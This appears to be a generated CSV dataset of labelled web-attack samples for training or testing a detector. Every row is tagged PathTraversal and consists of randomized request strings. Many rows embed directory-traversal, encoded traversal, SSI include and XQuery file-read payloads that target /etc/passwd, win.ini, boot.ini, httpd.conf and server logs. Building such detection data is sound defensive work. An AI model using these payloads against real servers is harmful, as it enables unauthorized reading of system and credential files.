id,class,vector
17882,PathTraversal,ShayaStr=0w7noO&OaPv=9nodbslceigapa&scrpLewrtennel=3djfimwS2eoorftaa&aoo3fuk=a&o9ei=tlw8me&5rrtxkyit=0190
17910,PathTraversal,/zgiI.nvUwi/aORjhWJgvR/@OscriptFdiviD/rmts/iVRpLc2lsoB3v8/5astatnc3eaifmreaymi/t0K4e.i@iEb/eydt8s5eDe5rtre/YRiXd5ztSZTqid/btc7Ja0zRwbCUPE/kesc.js?s3rxcseGq=tX-&aSi=2%3D%28o&doIo=6xH2oXY8&ttdTTstu=tte&d4zsdpl=hnstSft1&hiSh=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd&VXOIxT7=ni23rvrEeyodn8z5&ninrh=ebbR4IRoata&dxo=sijta&swilnhi4ad=carre&QPmYBJPC@l=nuGh6&.e0YWuoreIK=ttatiTaEsbbam4cTt&jlrE6nelAk=ehwme%28L&2Binputselect=105770
17927,PathTraversal,/e3tmnsn1teUc6/Tneetee9jlEmoyp9ihe/gTliSPkbKSHA/rpeuIn/tKqe-/Ks@VWCPCWiEu083/avD/q8xNCYcmOcE/8j0eTqdVrtelnetyJnXg/is4rB8cAEo6DAloaiYeY/oblpngd.mspx?ngux=rjSjfNjILw&tiu6C4kptlno=uriqdi&x2u38z59bhhreAn=66361&anEsobhkc=j9E4
17937,PathTraversal,/.nsf/../winnt/win.ini?
17958,PathTraversal,oyR=%29oVi2z%24e%3Bird+%26&sn9elR5osern1Eo=8085728799&0zHXhttpsEidxtermf%uz1=e%3A%5C%5CWINNT%5C%5Cwin.ini&seh15=bd&trokrernnuf=5iae0nelirlrtneay&n8oeixtersn=16008&theabo=n3rqwp-aT
17970,PathTraversal,/ie/sdrruc/eek6LX/KdY7.8Xrh-iGautoexecnullB/7tBpYwFR2vY.A.@t2BC0/SK5cjMYY/qaccess_logDGs3.8HTzchildpNE/SDr-OsV.5l4@1Rb/omtaQ72znLLQpSk-/svS_z8-_5JTnqWfVfiU2/3kIposition5jallOMVqlinkK.nsf?fyeetmioitom=61&sunsRreng=8116&hemxf4u=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&u9ecO=j3alo-&hseanef1=7ifgak&NgVvEw=n&evlaSbiodalere=hchildee&Tdxtmp9S=zi8ka6fynrh&Reoupk66ayeZtgt=8938&csirmReRs=0rahuh&dor6d=bdnrit
17986,PathTraversal,oovbdlgltteo=apassthrudats4\%te
17990,PathTraversal,/1lnIwhGeLhL3y2em/uP_bEeaDah3/wwQtXBj_/6pPqFD_/BobjectQdMHki/0J-BopocfN/rYzbMqGyGM/yQ5gQKH3.shtml?soi=aopfwieEhnekagetw
17997,PathTraversal,hateaOP=Emsn&asyose5erc=095382&u1Assock_streamu-gr=emqTtvEnelew&GQ04Edeletedivn=8&etrrPEglx=/../../../Inetpub/iissamples/en/timees/nsng/altellin.nsf&53cm=sw
18014,PathTraversal,/2xDO4K/anlrhectniwhl/9cobjectZuwDVk2NLFq1/i.GGIe1/tX.ApYpL3Cb9xkZDeX/lWNtoWdigav.png?ni=%40neefM&TohttpAJfDT=an&ohvajlNhIom=d%5DKh6hidaiu2es+&2em8ttdnetscdf=3264015&likePBv2=izici2xp_p+&ne=31&RfkL6s9@f=%7C+etct%24object1&wee1nfrr=aHz4X&wPunionKimgEH=nwrU6
18023,PathTraversal,/atuceteudssos/k5yxrel5ttgUDOGPPJ/6r5htaccessf_libEreplaceboot.ini/byazrre/nnthrs/tQnckq5d0_uFYnpAhG/aiisboOis9tsiauqriil.htm?ssIo9hikr0fowaf=%3E%5Cvp&9rrevdGrnchfpwe=zhWunionls&oViisewket0rUe=e%29trip%24go+te%3Btrs7te9&9jpytesoltw=1a%25+
18034,PathTraversal,/jaeweri5eUucrrsn/enTq0TKLP/tsegcAepcusaslaou/fAUwHra7YvoSVN3F/c9rno/eO5bqsE3JC.k3ps/nph-xhISTN/ivLECAXSS9e3gG66Eloy/uquOi8NO7Q2Ob8TsfM/E2JqdropnZxmieJjF/nCwgURmmV4WjjewAru/rU..htm?2e5=5644325&ldeao9l=ekIaTT.%40-p&oa=dMet46tw2&ieooRtgpa=n%3D&WYb=ia5U0-m-Y&piTrdyvaN9aa6n=+ipt4braaccess_logn&DQ2admintXGSgSu=c7eautoexecta7-mpehc
18038,PathTraversal,/3Sot/siht/vHs8iii2e/5wcrmsdoytL0liteSmd.htm?eada2aNgaw=h%3A%2F.htaccess%7E&Vdiw3oiei=28816
18059,PathTraversal,/m5vn/mj.SXUshutdowntKbgS/oa1je6aemtE/ss6nro/vE/rr2eu5fdnumeaw7h7.msf?6sbeghtnq8aP=oL1pAe1Y6td&0tAenEtaarogcha=976&pt_LIO=ezOjqQ&pDjAwF=n%27nneaeosr++d%2F8eSa&hnGsfeo9e=7268&sActmWtu5=tkOQFsr2&2_66=92&ehieuselyt=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fanne%2Ferorlael%2Fritaonin%2Ficveliastr.pl&ieefbs8xdll=snd1sa&4xDM413REc7=riaOrhnyxna&o4u=%3Ce+ot&a91leetOuo=6GOC2b&nu2wodnkuH=5&2YRscatQs3nH4=%2BhttpldivmrDesia-eti&enors=80310
18116,PathTraversal,/jstaaOs.cgi?z0PMf-xp_D=sRNpnDAhgo&rioerddlt2nn2e=%3C%26S&telnetIYX-g=om4X&t1IhiyOsSqu=-Eoss%7Emoea&M-DP707etcaccess_logXh=17264&M1ei3tyneni=eg_iNyWfA&4t=it36_&EnTcbiiilsw=fu&Osv0=doc%28+++++file%3A%2F%2F%2Fc%3A%2F7f%2Fnddz.xml+++++%29&setewn1sLf=466435&awatuHG=xNGr&awsim8mtnv=wZ2ixOPQ.&iF=9
18118,PathTraversal,/3-pZ0-/wNebv6Yc5Kps.js?4Ag=034351&sstaSpmtbaonou=%5CWINNT%5Csystem.ini&su=adtd&Sh7ANV5=e3SOCWIh.9&ornwcsfelto89=d.ag0a9ILA9&i4=015&iaEaf=5898&s9ugC7connect=1ees%3Brt&wutlimen2o6a=22
18130,PathTraversal,/mNntl0dstgahryiina/mKYv14Facy86qsn0VC/tGo3AkqgHh/vvrNvQ-GNw3.html?9un=Ln+Itrs+e9ect%3Ahf&e8iasukCi5=98749&71Rn2tt1irr=9125350037&striL=delete%2Fqenh%3C%7C%5Drelsea%28y&o1temopbeh=..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&fshnhbaraliense=124882&swayi=a3yP8hL-gT&SdmYN1xCslikeF=4192&nph-tS5positionOn=e%3F&o3aqdonoAeu=g3s&uns=386449296&vcnnnWtaRS=9771&tsj=03006
18151,PathTraversal,/akFUUr-AvkLfXDJ/s16a6/sztXWZWijZNMh.asmx?WV80CGo3uwhereYs=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd&h7w6a7las=ac+a%7C7a&hiwetetaralwar=ib+su&mc2in=5778
18171,PathTraversal,/Sietttonnaatidyl/cMijjm3gySkYMx9/QK2IVJaccess_log/mXYN3q/8O2IidtGPandlocation/S5isbVumdlc/DVDmocha7perlbxoK4e6/aSJ1BJ0m7SF/ci.jpeg?ecoheib5=%40t%3F6i&39faiumlsbnhh3I=7dT5%28c&taa=a0Ast%3F&2l0igwgm=collection%28+++file%3A%2F%2F%2Fc%3A%2Ftis%2Flddic.xml%29&iwhirTpmn1aws=ekew&Co1r=2679&mNaifeaotH=nlhea&sery=oa%25usr&mdlce=1901552&rpu=ofs
18251,PathTraversal,/Tc5Y/rK5pyWU3ewlE/ooslSk2F/ilaonthb0178ophji/xorlT9qSfx.css?ughetttpBaiae=2427594396&FxbRCG=smrKWn8&nY4aitxMp=wLir2&icqRi1yeROo=%2Fetc%2Fhttpd%2Fhttpd.conf&rshshd=hb%26c&ttkgenen=3050803&sqp6tn=oAtmhttps%3At-homeEixe&Mb4P2PAhttpsUX=kTdSr&aaiiaAsh=ao&xtermpassthruFoptreplacek2=trd%5C8h&ost=67873125&n5sTo8kEm=uHRphl%40acRWh
18259,PathTraversal,/klt4VQEJ8DEKaWY4MKr/RX/ri/kVHIX7I/DRvZCRYH6/x0Dz1homexmlhi@iUxeT/d7Zs/lWm8ieEa.nsf?4adhchtda4c=os%3Bt&qDo0H8y=th7sa&l0ceo=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion
18264,PathTraversal,tay9ymlhclaqe=cta window.opentei&sjbud8vebn=file:///i:/lsE3e/rrdm/ho6htn.xml&aoinmNEot=troEe&ty7qairdrvAaeih=19831561&UiiorEZqandfcf=3ZO4sQL_&p6bcmtttglfe=5185&ot=h8uhdEZj6&i2une=dhrhAfr&syUrqmhtggiE=dY@Ywq5LX4N&hdTiehpi2gt=9y oHud;olfbWia
18278,PathTraversal,/mI4lRkCl6b3p983Y/rLl/tH98PRLZz1X-bc2B4F/ovu/t_XwmEHQoNgLSfA/eenhueTiNsoRMH/5ptif6Tnduhdqomq9.jpg?Th27rsi=orot&eHhsmheSIbe0aoe=dO+t&ecc1=tJ7yY&esoteeaet8itv3p=ehtaccesoi&ieeFteej=%3Fdi&omkvTniays=254&ITailNn=rvhh&DO3Zdq=dZha&ihnsvvva=11566878&germmt3srdna=collection%28+file%3A%2F%2F%2Fc%3A%2FNdAex%2FasieT.xml+++++%29&JLqSlservices=i7GMM8y&semen1i=ky3bvneh
18308,PathTraversal,/hav1l6tC/ua_YfNLx_gYFMA4/mh/ormie/8ndazehIriEatioyoe/axf9u38A8hHp4J/nM8G/e8stTtuat.htm?location419HUG2=JngP&omnnse1=m%3A%5C%5CWINNT%5C%5Cwin.ini&eweltena=n%3F
18333,PathTraversal,/saeh5neffiem/tQU28fT9ooDhiJ/NnaTiAstealt/s5OgwSbp@3B/hAmwherewaRJv/ebgvsetysbUabccsrqc/moslneletamnntxi8/eRSTO8Tk7aORYGr/n4sK6FLyTsD9tTB.O/hNRskUuqibU4XDI.jpeg?ydnpitsxedo=.%2F..%2F.%2F..%2F.%2F..%2F.%2F..%2F&be=5478973355&ov1Up_T6Btp=%7EtTdtzmto-
18348,PathTraversal,/oBQbwuFBm9yi4fG6a/gL/o.4wEy/oCHpnnXTq@/eRc.dll?n2grTbt5cOs=%3C%21--++%23include+virtual%3D%22%2Fetc%2Fpasswd%22--%3E
18370,PathTraversal,/haple7Adous55a/lmbioedrwzgsh/Zhome1cTBN/sespahvalWmlyje/btkjnlat3yun.css?n4tatohe=.%2F..%2F..%2F..%2F..%2F..%2F
18372,PathTraversal,euea=oaconnecta@Hnx&tsqweo=d4e0SCI-b7l&teoresbe=../../../WINNT/autoexec.bat&sghaenns=|/e&r7esnt31i=mnk11AxNe
18375,PathTraversal,AiaIaqc8arui5i=jBA6p4&hrjEdhoonnsn=tnZ&udlaAedtmjm= access_logqHphpeie&5Ht8cs=470&t2aswg1=access_logpasEBrcr
18402,PathTraversal,/dnrpedcnRtteqFrt/bNihilearpneal/nPphpTxusrF/ehIkjXB08O_a/mer/tiXpty9.5VYA/iAKU/nUNWvDa/ohkwa7rhhtabh/iZ3uhzCjHVDS5sA.dll?ilhhmwdinme=%3Efelt&W6wEz=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&kTibhmea9e=603544758&rotoh5vtkmeh=erUconnectT&l2Eroqoc=00&wmsrltuatte=si1sno%3Dl6N&rvonawE0fecnbnt=wydt%5Cepf&etnS3juodea9=sabseennmtrta7
18509,PathTraversal,/vt/4HbTk/sS32AgtDq/ta2iaIespsl/c26dNUtT4VmU-_/BEDylsA4Z3Et2s0/nGggrJ8@rtRH/ugz6ht6ttetdrnr/uYVVD0YSfD@PF/nttw.js?el4sjweoc9=bderoa70Erlofkan&ffRnbCthHoahhl=i%40qSV3y-&og=%3ENoaf&hsbnd5iiur=fhs&saaEuy0Q=%5CWINDOWS%5Csystem.ini&5odocumentDlZtJ1dl=10911939&ee8lokeEeh=i5i&bwnReeaa=593322
18518,PathTraversal,/eX@@4h.kAkFrdgp/ejosouittri6aoyS/s.7zxxzV3pst21P/aH-yxKCehxFHSAC/dW3h1WVabk/u9/fGLF6Gqzw1UVnsUz/jX6MYdzkTs/uysmNa/djyqxvtqVelVzHJ@/oF9rhLYJPdm_kCn.tiff?naeaatoaedxooto=fa3ces0qhmea4&6CEyWt6XX=collection%28++++file%3A%2F%2F%2Fc%3A%2Fgtdt%2Fsipnoi.xml+++%29
18534,PathTraversal,RI3A8kWj_Rpasswd=71731&the=219048&rmQIQhttps7FR5H=..\..\..\..\..\..\WINDOWS\system.ini&hbo7xrsCre2=[snsochinaau\is&sawhkR=ort&gnptag8poeowlr=09843
18546,PathTraversal,/r07jh47yFpQDvhEx53C/j6CVBy4F9jrJa/s4st6iMhieonfl/dN7Le93ScCjl/ItYmt4hG9uKg.1P/dwreEPflGzucDsP/sttU3pXpHrj.css?1MPk5IM=ypxjis9dt&Fiu0tsmm7kxu=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fontiat%2Fan%2Fnaremealnt%2Fiema.sh&esztlSAehhS4H=ourgo+oe&etacddeseii=23863
18547,PathTraversal,sinrsddelesyvpc=hoj&tust=0686&er6erNsieTr=e&1s=epCS2&nLqrcS=tGAMTlBA&omectnec0tesmS=4&oizEmamuA=4545554&kTEratErncstnrQ=45847&epr1gogr=a2Pnii&lrfat=pif3QKK&Oscadrwa=sST5N&Rtgt=13059&nc0r=ti &dVLJLdV23=w5fformmerc8uanda7A&aftSfewmeb=re
18555,PathTraversal,/Icpwgetwhere.php?yEo=4rOrcmd&utsiamc2rdEas1a=926641048&ie=td0&uiPgeefr2hct=%3Fgroup+byq&niiecbnsaime=sTngaSress1f&VMFgBMlogOBR7=220417628&l9=Ms6Ala&2dYt=..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&abnzng3t=bo&nR9erera=tP0hMiL3TcX&hotroicdtnr9=s_5UnW&rnaeumytnoewm=aLaOiiJMn5eH
18568,PathTraversal,/TadlhWbtsosisiJnygor/aRnl@bA0J/inivsere6xse/e6uSH7IKKMXM9G/erFH6ei/apZyXXVShUBxz.jsp?6ods6Geqentcel=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Fse%2Ficrees%2Freeseltime%2Fas.nsf&tuasegcsH=rridt&DU1C-F=%3Bni
18588,PathTraversal,/NoswehhartoAiv.php3?ehuesopoer=2apdhpa&hbym=29&RbR1lsThN=3&iRTye1a94chel=aenhhatnier&1RIoptllPwzXzecho=78778&omru=4AN&ctrfleEsvo=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&6Bevenughugs9b=dnsmn%26pnn%40erh%29Kj&cn6mA=o54bowUt&6rcle=5&bhtVestotR=ntay&u1deusmhhQe0nk=1d%28e&etbidrWen=141&rO@BG3Ub=21&el=i2HUMsl
18631,PathTraversal,/hTmdv0aAOgPyhfnxk/rvHeSy/hijtnucbb0odkoa8/toetltSfmx.php3?td13ia=hme+&otnqt=94362&nvDZUopE8pth=u%3A%5Cautoexec.bat
18654,PathTraversal,/eAmAZfpIHtP2Ya109a/s0Tx/sowsiheisF8nn/cjE.pl?3JchildO=cro2eqrcl9ises&iei4sml42oe4r=tbwhereelscs%26ie&eizodteuiePe=388&frsssInuoe=..%2F..%2F..%2F..%2F..%2F..%2FWINDOWS%2Fautoexec.bat&nntJs8aieisue=lu1e&wEou=1kE1Iod&dorepobt5h4tn=tshAeN7rhtacces
18680,PathTraversal,/hufg5rla9cu/tostccniTltstrilwgsr/HKBcmd1pKo/en8/tnYDIuoSA/dqVGouKek/idKRY@.yURvKcZjdK@/1en6ir/tq8Q0zOVImr66grOFeHb/e6q9t6qonGcb18DZo_Wo/4NGXEWZea/D@evalqwindow.openqQZQ.php?akoHsd4eHe=2488478&0eug=td4he&veLi3het=5ee%2F&E7uegJ2cyi=fFI&ttnwqztdiua=u%3A%5Cwinnt%5Cboot.ini&oh8tem8tvoil1=hNuFeWlv95x&PQEH=6975&-kqT4deletenxYandp=redoen&eys0aEawsEo=80408179&racyxsae1oTtp=s46leoohc&utlse=%2Bgyin&ohsenjcseLyAhrx=g&onasEcNraRseht=zsa8cH&lU6M9H_x=73I.qoy
18706,PathTraversal,/2w/tgy5UietPrE/t4xVVA2mFftS/1ZsHBmo/atoh.jpg?SPieeij=sX-Zf.rpmh&u2lzI7@3DE=rn+edf%24&cteeansetNd=844871&a09iylpl=%2F%2C%2C%2C%2Fnsplos%2Fo3s%2Fpasswd&bsr=htpass&oe=R-htpyq%5Dnhttps&wtjwoW7t=psxdt+idrOetci&se=usBiga3alndtc7&smheriqpltmhc=01291&lahteRs=Sg+%2F3y%5CksKzry6n1&mdmspu6si=13311&xp_lwSUai.U=ityr%25hu%24&c0ywkksO4=07356926
18711,PathTraversal,/dSY6Ia/re9dceledwgedifdv/VtmpfW/fseebmtapszvnimjI/iileMdeoAreptt60/erervhenrfiatUeiTnN/lhgCvnrarna82de8e/MMOe98g/Tda/0U-orZuC.css?eEdyetnsx=i8INxMz4EYC0&QW_zin9KpRmCX=aC_2H.R&aWazenA=neanathvso7rqy2Er&shrduese8f=o%40pdyX3g-3&d5ewE=6&pfrPVaioXD1=%5Cautoexec.bat&anthc=e_ssgy.h&bbuihOnsuhhaoqr=e+oh%28erhome%3A+y6inataei
18720,PathTraversal,/slaeehecy7q/e-AvEADMCUlV.jpg?drlsfAieda7=avBPigx&eoi7ji=rhdaeesvyinjnid8&binETm-Ob0eX=%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Ftend%2Fnslaeseser%2Fnaal%2Fll.sh&Loqm=969
18727,PathTraversal,/auQ.m67eRl.-_0/9Tpl3etzEqs/sBdS3yuJZvj/ReinNfaZr/nNzT/jtfbTr8W9xaJ8z/mV1P4X@0/ai7Op5TGryu/eUUb.nsf?oBithyetii4sw=r2&QA5eiebiaodb=97577326&aW2YmbodyRpHly=8630853&eos=t%3A%5C%5CWINNT%5C%5Cwin.ini&ygvv6Os=j%3AesOhddrcepMjT&tf7ann=29&Ohbghriedmca8ho=mqcwindow.opene%3Fasnwi&tsklhze=tgN
18729,PathTraversal,/tuo1e5/hFI3.nsf?A9xa=tttiestylehr&op=..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fversion&VJ34Bkvy=89325&EtshutdownEaYQ0=%284%40rfpoeia1ee&mfrnoiareoeaans=7665886
18757,PathTraversal,km6iiaeix=9ostr&Fra96gW3=0799021&s5nC=4299&ese8z=677&ocitjhit=3940&44zzCbD=../../../../../../../../../WINDOWS/autoexec.bat&8gsT1noo=x589ZAjQ53fc
18762,PathTraversal,sriNaysf=<7Qlt oopens2w(dfit &eotzUn=928061&e3aXdu59N=file:///n:/go/esde/ora780h.xml
18773,PathTraversal,"otns=rixiusrctnon92&TtiB=993&SB_taC=aun&nbptadDecaee=mcl):tetyyefi8&0Ed2eor6hteh=ahraynlink&1UfadphpAshutdownu=<!--#include     virtual=""/etc/httpd/httpd.conf"" -->&catnAF=eYhntA5tx1oi&ieeI=2380&rgWUOukdS.TF=cDRl0OE"
18781,PathTraversal,/.nsf/../winnt/system.ini?
18844,PathTraversal,/n5DQF7-85/vJAa8VVQWH1E/0RpImio_positionincludeGQgi6/JYyTl3/t2Xp0@aiV4ylRKm/eE1geaiira/rnamwhgdMznsehOan/cbrelro7n/ieag/5sKorlxHgd/f8Pqt@9NJCINhxfBVogB/cyxjVW10zXTp.-.dll?ahrn9npacamPl=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&TenW4lq9bs1ect=otlic%29h%3AtmpofD&T1RX=789644490&te0ontngc=%3Do
18848,PathTraversal,/Qwcle4XidhihTEcnerqs/ehtyYstihtnrrt/cnaaone/gXou8IIRmy9DCU3HY/ifNae/ZdMtnotpobono.js?Gc2R0SxSll4=gLrairqnntot&hUbntonoxaean0=8313241&rreev3izMd=6167&eLvebNsoihr=0tiyhe1hban&ti=%26ihlibehe&a@LY3p=%2F.%2F..%2F..%2F..%2F.%2F..%2F..%2F.%2F..%2F..%2F.%2F..%2F..%2F..%2F&di2ogqrnEmsRa0=LB6m&rpb0idus=19472518
18870,PathTraversal,"ptz0ae1Rrgbh=874112&ahxvl=s-hb_Mwh@4&Z@Hc0Mr= ftpn&&mun8enedknrtm=iha6gmenswalllikel&rCdh=re&daynsot0aper=00179&o1nlXhev=<!--  #include virtual=""/var/log/httpd/access.log""  -->&saner3ahAflci0=copykbu;hyl &osulno=car&aeantRhatzgua=367495608"
18880,PathTraversal,/B5q5qJ/aaan/qxUvoL5dUvw4.swf?IchTs3akk=%5Cautoexec.bat
18899,PathTraversal,/thyElnthioev/1joDne/EnoSe/p8e.gif?sG7a=e12includeD&0rtacnr=%5C.%5C.%5C%2F%5C.%5C.%5C%2Fetc%5C%2Fpasswd&hatne9Fbjtoehr=Me+odlzard&stbstmernrar=r
18906,PathTraversal,/iT9y6tEa0ei/dDEISS/im-uWjLikmYfhCc/pipaest5psaaeyesi/zsutdrBomzqhspfreemm/K7m6RiRnupdate7xp_na/3fF1GRvJ5ylBxoziVz/paUH/o5y9ssu.mspx?
18955,PathTraversal,/hr6ttodnweMT9n/dgDguv5CJV0Tn9bYm/6gOiFN/evVz0RQeX/esIP7eN_EaE2u3UM8eNK/pFEO.dcm39N/ree9snoslS/ykleteauaotn/clowixdp4/rKqLA8/tpiiihca.jpg?krsrsc=..%5C..%5C..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&Wtkt51oreae4trh=sVd9Ta&gyji7aen6EOn4c=121&aeedttdhd=ms
18967,PathTraversal,/taowia/m521c5_OHt@PouRKv.5m/enclmh8tali4ii/4MNyaFuvi/iIA/sIw/euahrwt/enixNOwKxYutyulf9d/hiSl/dLuHo.aspx?fopoEn=ewxxg&9ra=eu%2BoRvbscript&entenEetegrl=0&wntp8Bl4soart=d+%28o&kqexecsock_streamDwnPoupdate1=st&pUmaltfoftn=ugobohh3inht&9nsek=Mewrlelt&6ans=96Hah&aIcp=xno&eseVtrv=o7ZUY-_tF_MS&ktS9Ew=..%2F..%2F..%2F..%2Fvar%2Flog%2Faccess_log%2500.html&Iodr=rsAd+ldAc&0MI6XKrbSHswp-=le%3A&hotoax0ore=eesthrap
18979,PathTraversal,/OWVoMg@DTgE-echopl/dpsGOT4/oae9sseo0OtaTve/rUZ@_/dxtenhathms/i2AiE.lix/1aJM6mwba.ZDnph-L/rryJ4PsVNoW/tW-1iOj2M/negsrOq/UgNlnF3.0Vh/ip@zraEUEY@6tHF5.php4?imgZCb94S=4031499642&e3hbieht0hp=collection%28++file%3A%2F%2F%2Fc%3A%2Fqro%2F9aratde.xml++++%29
18989,PathTraversal,/sock_streamI/e3sqWN2.gif?z7@5KIq=htranroeitpe&ihwdefinterRl=1&dees=20&splCiJob4eedt=kHjawprocessing-instruction5e%5Coeppb&v9nvtatiosh=9&0N7Suaionte=ii%29t&aMn=bp+ennwsnzmpt%2Fl1c&W4uNtv8zfpl=drls36r%288Zn&q@EYt-e=NtthuphTneArwess8&Uw2pOwOY=6snuu&mbiocoa=owX7tlF&hhlIrst=ohui&nfcctee=56&uEunitSooNa=ht7aeshsobK&rime5httt8eh3sa=hof
18997,PathTraversal,/rcuRAUGgwed6kw@WQzjB/uT66INUlR33Rnullu/eeonciuecx0nenel/Ke/3wea1d5xoe.gif?9fqtw=7&_Fe5tlcmd-tmpXstdin=iiim_38zzs&nxnct9cengHnd=..%2F..%2F..%2F..%2Fvar%2Flog%2Faccess_log%2500.html&T4=885&4ioi=+
19008,PathTraversal,/.nsf/../winnt/win.ini?
19011,PathTraversal,/2Xgq.tiff?1fhwrhihf=doc%28++file%3A%2F%2F%2Fc%3A%2Ftfy%2Frwepxse.xml+%29
19022,PathTraversal,/noEettWusmruwvie/pL6sEGTwhg@vEeQ_CFl1/wQk/mlahfe4agzdczid/noho1udnno/f_Fr6dUK2y24.bin?hfkoEnal=41015&PlibzeG_b@6U=tET&upua7=mgtdL85a7xvleaidon&iaeit8ojtr=..%5C..%5C..%5C..%5CWINNT%5Csystem.ini&d5qfiepykp=45&qUrmpY7Yl@h=479846&tITTaj=86&R9scriptLsGacceptA-=u5HgO&lAYpwgetrmYrz1=lohao4yn8update%3FEC
19025,PathTraversal,/jFAXLyO_@znCc4vLae/P9Mt7Yk/l0tt/ovs/NFVX4y/rn0lfehogiahsrtvdTs/snblthnhu8yr/kk/pxO.cfm?cEewotecne=7hetlMco3g&ahe7aod=22871&UrK55yQE=it&gahscesY=..%2F..%2F..%2F..%2F..%2F..%2FWINNT%2Fautoexec.bat&zntvhouhpeNPln=3sageeghsyEn&cs=4987424&@rrcp7g7Fe=r%3D&rhep39xsSses7a=43829&dqouinaoptekp=6104888&aat=n+wenwnccd%2Fhtey&gdaq7eiqFie=tow%2F
19061,PathTraversal,pqni4eywutev=tsJqxIDk3&tmoppknn=yb1pEo0e@dno&su5rsqtss=63&Eo=o_1w@E.V&irag=eK4&erac4=19152937&obntvpi=eia&rpsTautoexecl=updatefi5se%&ssg=hsNAWn
19106,PathTraversal,anrf0becehadshA=012&4t0mSmu=h:/.htaccess~&iianzteeae=sqnoedo vear&ZoJxA5N6F=935202591&ardehIaidreh=657&rdeeG=6845650&neeP0se=odeiadvolAIyt&wrei=753286&aYdeCsn= cdropm90Otcopychildsonlnkiecho&eAiweot=anm1lmRuh$tij2e&oeeniyeteopk=lyikiIwtyrtseti&eeIg1t=whglocationis1nzooelibi&9ierifElihlAo=aN:noer&jfhvonei5wudkig=7paw3o
19151,PathTraversal,/Han/xht0trnrtatecc/dP/TgjWimgjD/tlk8srLrUjem5e/nta/Tp/gr0/lt5VkF.M/nYIivr0NXP_/iL@3A3MoyD.asmx?elwb3orike=1657&WweYX0v=locationdocument+n9A96nn%5Cip%7CNn&olinkmadminY=542&ate=%3ElkadminwnTod&b3aourgi0e7n=0218&vrht7torwl1o=iHnbGY&ortusnocafels=q
19152,PathTraversal,/sxt6eb/releeuitnaihCn/9eeedrtrr5bnGnleev.asp?dtafMrau3=tmtnod&vichrmmNf6eia=8008&mnOrloecs=ptmpet0-+j+wzr6lsh%7Cs&lTIex=pgMmFJNrUTd&dm=idocumentro+g+&eugnnei=yldtydyfetpefd&nes=o1DYpe&decadldeenmb=rJHPYe%40&olcnuaz=tQXI5&mns6t=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&vdee=479
19222,PathTraversal,/hmtet3ndtrno4erau/oq6tuhriOrahruDunim/1bdin/oemsoaqpTrnpyieehv/i9hsne2tsu/ByTO.exe?9sr4=4nslinkchild5ne&t7ddng=6&w4iewreowemasra=ak-&orarW7eoiau7a=fRwWnM4%40&esnetzr97uhqa=%252e%252e.%5C%25252f%2F%5C%25252f%2F...%5C%25252e..%252e&o7ian3lranocfez=koTmo
19257,PathTraversal,/fpX/8lGRql/9r/iOEwW/rPU.uh8y8i4eUPd/s73mH_w-/nw0W.NqKLSH/64rP./Echlo9tbv4adyaskbio.php?rluid1hdsennee=E+iuiaobjectyoereaZ&EtS0imvo=d&KtyupdateWnph-EFvJ=eTT02IXU&y.fw=bsE&edaHehjtetaUR=t5n&ktgrEnukneaeso=6714&0tGscriptxRSupdate0._K=019677375&cuwpxGsse=6576295&8_Nw@-t4GQ=k%3FTo%24todtqoai&u-SRt=ejvuiii2
